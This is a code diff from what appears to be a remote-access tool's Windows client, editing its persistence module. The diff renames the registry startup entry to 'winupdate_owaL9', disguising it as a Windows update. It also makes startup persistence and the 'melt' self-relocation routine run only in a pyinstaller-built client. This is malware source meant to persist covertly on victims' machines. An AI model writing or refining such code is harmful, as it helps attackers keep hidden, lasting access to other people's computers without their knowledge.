@@ -19,7 +19,7 @@ import wmi
 from src import errors
 from src.client.persistence.persistence import Persistence
 
-REG_STARTUP_NAME = "pb"
+REG_STARTUP_NAME = "winupdate_owaL9"
 COPY_LOCATION = os.path.normpath(os.environ["APPDATA"])
 
 
@@ -51,6 +51,9 @@ class Windows(Persistence):
     def add_startup(self):
         curr_file = os.path.realpath(sys.argv[0])
 
+        if curr_file.endswith(".py"):
+            raise errors.ClientSocket.Persistence.StartupError("Client must be built with pyinstaller for this feature")
+
         try:
             app_path = os.path.join(COPY_LOCATION, os.path.basename(curr_file))
 
@@ -67,9 +70,14 @@ class Windows(Persistence):
             raise errors.ClientSocket.Persistence.StartupError(f"Unable to add to startup {e}")
 
     def melt(self):
+        curr_file = os.path.realpath(sys.argv[0])
+
+        # ignore melting if client has not been built
+        if curr_file.endswith(".py"):
+            return
+
         tmp = os.path.normpath(tempfile.gettempdir()).lower()
 
-        curr_file = os.path.realpath(sys.argv[0])
         curr_file_dir = os.path.normpath(os.path.dirname(curr_file)).lower()
 
         if tmp != curr_file_dir:
